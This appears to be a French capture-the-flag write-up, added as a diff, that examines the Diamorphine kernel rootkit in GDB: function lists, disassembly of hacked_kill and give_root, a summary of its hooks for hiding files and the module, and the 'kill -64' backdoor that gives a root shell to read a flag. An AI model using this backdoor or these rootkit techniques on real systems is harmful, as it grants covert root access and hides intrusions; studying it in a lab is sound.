@@ -1,0 +1,215 @@
+"""
+szzaps@vulnhub:~$ gdb -q  diamorphine.ko
+GEF for linux ready, type `gef' to start, `gef config' to configure
+93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
+Reading symbols from diamorphine.ko...
+gef➤  i func
+All defined functions:
+
+File /dev/shm/diamorphine.c:
+89:     struct task_struct *find_task(pid_t);
+60:     unsigned long *get_syscall_table_bf(void);
+247:    void give_root(void);
+302:    int hacked_kill(const struct pt_regs *);
+100:    int is_invisible(pid_t);
+293:    void module_hide(void);
+286:    void module_show(void);
+423:    static void diamorphine_cleanup(void);
+384:    static int diamorphine_init(void);
+180:    static long hacked_getdents(const struct pt_regs *);
+114:    static long hacked_getdents64(const struct pt_regs *);
+gef➤  disassemble hacked_kill
+Dump of assembler code for function hacked_kill:
+   0x0000000000000280 <+0>:     call   0x285 <hacked_kill+5>
+   0x0000000000000285 <+5>:     push   rbp
+   0x0000000000000286 <+6>:     mov    rbp,rsp
+   0x0000000000000289 <+9>:     push   r12
+   0x000000000000028b <+11>:    mov    rax,QWORD PTR [rdi+0x68]
+   0x000000000000028f <+15>:    mov    rcx,QWORD PTR [rdi+0x70]
+   0x0000000000000293 <+19>:    cmp    eax,0x2e
+   0x0000000000000296 <+22>:    je     0x340 <hacked_kill+192>
+   0x000000000000029c <+28>:    cmp    eax,0x40
+   0x000000000000029f <+31>:    je     0x2fe <hacked_kill+126>
+   0x00000000000002a1 <+33>:    mov    rdx,0x0
+   0x00000000000002a8 <+40>:    cmp    eax,0x1f
+   0x00000000000002ab <+43>:    je     0x2d5 <hacked_kill+85>
+   0x00000000000002ad <+45>:    mov    rax,QWORD PTR [rip+0x0]        # 0x2b4 <hacked_kill+52>
+   0x00000000000002b4 <+52>:    call   0x2b9 <hacked_kill+57>
+   0x00000000000002b9 <+57>:    mov    r12d,eax
+   0x00000000000002bc <+60>:    mov    eax,r12d
+   0x00000000000002bf <+63>:    mov    r12,QWORD PTR [rbp-0x8]
+   0x00000000000002c3 <+67>:    leave
+   0x00000000000002c4 <+68>:    jmp    0x2c9 <hacked_kill+73>
+   0x00000000000002c9 <+73>:    cmp    ecx,DWORD PTR [rax+0x108]
+   0x00000000000002cf <+79>:    je     0x38a <hacked_kill+266>
+   0x00000000000002d5 <+85>:    mov    rax,QWORD PTR [rdx+0x8b8]
+   0x00000000000002dc <+92>:    lea    rdx,[rax-0x8b8]
+   0x00000000000002e3 <+99>:    cmp    rax,0x0
+   0x00000000000002e9 <+105>:   jne    0x2c9 <hacked_kill+73>
+   0x00000000000002eb <+107>:   mov    r12d,0xfffffffd
+   0x00000000000002f1 <+113>:   mov    eax,r12d
+   0x00000000000002f4 <+116>:   mov    r12,QWORD PTR [rbp-0x8]
+   0x00000000000002f8 <+120>:   leave
+   0x00000000000002f9 <+121>:   jmp    0x2fe <hacked_kill+126>
+   0x00000000000002fe <+126>:   call   0x303 <hacked_kill+131>
+   0x0000000000000303 <+131>:   xor    r12d,r12d
+   0x0000000000000306 <+134>:   mov    rdi,rax
+   0x0000000000000309 <+137>:   test   rax,rax
+   0x000000000000030c <+140>:   je     0x2bc <hacked_kill+60>
+   0x000000000000030e <+142>:   mov    QWORD PTR [rax+0x4],0x0
+   0x0000000000000316 <+150>:   mov    QWORD PTR [rax+0xc],0x0
+   0x000000000000031e <+158>:   mov    QWORD PTR [rax+0x14],0x0
+   0x0000000000000326 <+166>:   mov    QWORD PTR [rax+0x1c],0x0
+   0x000000000000032e <+174>:   call   0x333 <hacked_kill+179>
+   0x0000000000000333 <+179>:   mov    eax,r12d
+   0x0000000000000336 <+182>:   mov    r12,QWORD PTR [rbp-0x8]
+   0x000000000000033a <+186>:   leave
+   0x000000000000033b <+187>:   jmp    0x340 <hacked_kill+192>
+   0x0000000000000340 <+192>:   cmp    WORD PTR [rip+0x0],0x0        # 0x348 <hacked_kill+200>
+   0x0000000000000348 <+200>:   je     0x3ad <hacked_kill+301>
+   0x000000000000034a <+202>:   mov    rax,QWORD PTR [rip+0x0]        # 0x351 <hacked_kill+209>
+   0x0000000000000351 <+209>:   xor    r12d,r12d
+   0x0000000000000354 <+212>:   mov    rdx,QWORD PTR [rax]
+   0x0000000000000357 <+215>:   mov    QWORD PTR [rdx+0x8],0x0
+   0x000000000000035f <+223>:   mov    QWORD PTR [rip+0x0],rdx        # 0x366 <hacked_kill+230>
+   0x0000000000000366 <+230>:   xor    edx,edx
+   0x0000000000000368 <+232>:   mov    QWORD PTR [rip+0x0],rax        # 0x36f <hacked_kill+239>
+   0x000000000000036f <+239>:   mov    WORD PTR [rip+0x0],dx        # 0x376 <hacked_kill+246>
+   0x0000000000000376 <+246>:   mov    QWORD PTR [rax],0x0
+   0x000000000000037d <+253>:   mov    eax,r12d
+   0x0000000000000380 <+256>:   mov    r12,QWORD PTR [rbp-0x8]
+   0x0000000000000384 <+260>:   leave
+   0x0000000000000385 <+261>:   jmp    0x38a <hacked_kill+266>
+   0x000000000000038a <+266>:   test   rdx,rdx
+   0x000000000000038d <+269>:   je     0x2eb <hacked_kill+107>
+   0x0000000000000393 <+275>:   xor    DWORD PTR [rax-0x88c],0x10000000
+   0x000000000000039d <+285>:   xor    r12d,r12d
+   0x00000000000003a0 <+288>:   mov    eax,r12d
+   0x00000000000003a3 <+291>:   mov    r12,QWORD PTR [rbp-0x8]
+   0x00000000000003a7 <+295>:   leave
+   0x00000000000003a8 <+296>:   jmp    0x3ad <hacked_kill+301>
+   0x00000000000003ad <+301>:   mov    rax,QWORD PTR [rip+0x0]        # 0x3b4 <hacked_kill+308>
+   0x00000000000003b4 <+308>:   mov    rdx,QWORD PTR [rip+0x0]        # 0x3bb <hacked_kill+315>
+   0x00000000000003bb <+315>:   xor    r12d,r12d
+   0x00000000000003be <+318>:   mov    QWORD PTR [rdx+0x8],rax
+   0x00000000000003c2 <+322>:   mov    QWORD PTR [rip+0x0],rax        # 0x3c9 <hacked_kill+329>
+   0x00000000000003c9 <+329>:   mov    QWORD PTR [rax],rdx
+   0x00000000000003cc <+332>:   movabs rax,0xdead000000000100
+   0x00000000000003d6 <+342>:   mov    QWORD PTR [rip+0x0],rax        # 0x3dd <hacked_kill+349>
+   0x00000000000003dd <+349>:   add    rax,0x22
+   0x00000000000003e1 <+353>:   mov    QWORD PTR [rip+0x0],rax        # 0x3e8 <hacked_kill+360>
+   0x00000000000003e8 <+360>:   mov    eax,0x1
+   0x00000000000003ed <+365>:   mov    WORD PTR [rip+0x0],ax        # 0x3f4 <hacked_kill+372>
+   0x00000000000003f4 <+372>:   jmp    0x2bc <hacked_kill+60>
+End of assembler dump.
+gef➤  disassemble give_root
+Dump of assembler code for function give_root:
+   0x0000000000000700 <+0>:     call   0x705 <give_root+5>
+   0x0000000000000705 <+5>:     push   rbp
+   0x0000000000000706 <+6>:     mov    rbp,rsp
+   0x0000000000000709 <+9>:     call   0x70e <give_root+14>
+   0x000000000000070e <+14>:    test   rax,rax
+   0x0000000000000711 <+17>:    je     0x73b <give_root+59>
+   0x0000000000000713 <+19>:    mov    QWORD PTR [rax+0x4],0x0
+   0x000000000000071b <+27>:    mov    rdi,rax
+   0x000000000000071e <+30>:    mov    QWORD PTR [rax+0xc],0x0
+   0x0000000000000726 <+38>:    mov    QWORD PTR [rax+0x14],0x0
+   0x000000000000072e <+46>:    mov    QWORD PTR [rax+0x1c],0x0
+   0x0000000000000736 <+54>:    call   0x73b <give_root+59>
+   0x000000000000073b <+59>:    pop    rbp
+   0x000000000000073c <+60>:    jmp    0x741
+End of assembler dump.
+gef➤  x/20i hacked_kill
+   0x280 <hacked_kill>: call   0x285 <hacked_kill+5>
+   0x285 <hacked_kill+5>:       push   rbp
+   0x286 <hacked_kill+6>:       mov    rbp,rsp
+   0x289 <hacked_kill+9>:       push   r12
+   0x28b <hacked_kill+11>:      mov    rax,QWORD PTR [rdi+0x68]
+   0x28f <hacked_kill+15>:      mov    rcx,QWORD PTR [rdi+0x70]
+   0x293 <hacked_kill+19>:      cmp    eax,0x2e
+   0x296 <hacked_kill+22>:      je     0x340 <hacked_kill+192>
+   0x29c <hacked_kill+28>:      cmp    eax,0x40
+   0x29f <hacked_kill+31>:      je     0x2fe <hacked_kill+126>
+   0x2a1 <hacked_kill+33>:      mov    rdx,0x0
+   0x2a8 <hacked_kill+40>:      cmp    eax,0x1f
+   0x2ab <hacked_kill+43>:      je     0x2d5 <hacked_kill+85>
+   0x2ad <hacked_kill+45>:      mov    rax,QWORD PTR [rip+0x0]        # 0x2b4 <hacked_kill+52>
+   0x2b4 <hacked_kill+52>:      call   0x2b9 <hacked_kill+57>
+   0x2b9 <hacked_kill+57>:      mov    r12d,eax
+   0x2bc <hacked_kill+60>:      mov    eax,r12d
+   0x2bf <hacked_kill+63>:      mov    r12,QWORD PTR [rbp-0x8]
+   0x2c3 <hacked_kill+67>:      leave
+   0x2c4 <hacked_kill+68>:      jmp    0x2c9 <hacked_kill+73>
+gef➤  info variables
+All defined variables:
+
+File ./arch/x86/include/asm/asm.h:
+203:    unsigned long current_stack_pointer;
+
+File ./include/linux/kernel_read_file.h:
+26:     static const char * const kernel_read_file_str[8];
+
+File ./include/linux/security.h:
+363:    static const char * const kernel_load_data_str[8];
+
+File /dev/shm/diamorphine.c:
+35:     unsigned long cr0;
+438:    static const char __UNIQUE_ID_author292[13];
+439:    static const char __UNIQUE_ID_description293[24];
+437:    static const char __UNIQUE_ID_license291[21];
+42:     static unsigned long *__sys_call_table;
+284:    static short module_hidden;
+283:    static struct list_head *module_previous;
+45:     static t_syscall orig_getdents;
+46:     static t_syscall orig_getdents64;
+47:     static t_syscall orig_kill;
+
+File /dev/shm/diamorphine.h:
+28:     static struct kprobe kp;
+
+File /dev/shm/diamorphine.mod.c:
+14:     struct module __this_module;
+52:     static const char __UNIQUE_ID_depends121[9];
+12:     static const char __UNIQUE_ID_name119[17];
+25:     static const char __UNIQUE_ID_retpoline120[12];
+55:     static const char __UNIQUE_ID_srcversion122[35];
+11:     static const char __UNIQUE_ID_vermagic118[55];
+28:     static const struct modversion_info ____versions[20];
+8:      static const struct {
+    struct elf32_note _nhdr;
+    unsigned char _name[6];
+    char _desc[1];
+} _note_8;
+9:      static const struct {
+    struct elf32_note _nhdr;
+    unsigned char _name[6];
+    int _desc;
+} _note_9;
+
+Non-debugging symbols:
+0x000000000000094c  .LC1
+gef➤
+"""
+- find_task(pid_t) - Finds a task_struct by PID
+- get_syscall_table_bf(void) - Brute forces to find syscall table address
+- give_root(void) - Grants root privileges to a process
+- hacked_kill(const struct pt_regs *) - Hooked kill() syscall (backdoor)
+- is_invisible(pid_t) - Checks if a PID is marked as invisible
+- module_hide()/module_show() - Hides/shows the module
+- hacked_getdents()/hacked_getdents64() - Hooked directory listing syscalls (hides files)
+- diamorphine_init()/diamorphine_cleanup() - Module initialization/cleanup
+
+Pour Diamorphine la méthode typique pour obtenir root est d'utiliser le signal 64 via la commande kill :
+
+exemple : kill -64 <PID>
+
+~ $ kill -64 1
+kill -64 1
+~ # id
+id
+uid=0(root) gid=0(root) groups=1000
+~ #
+
+cat /opt/psychosis/flag.txt
+
+et c'est flag.
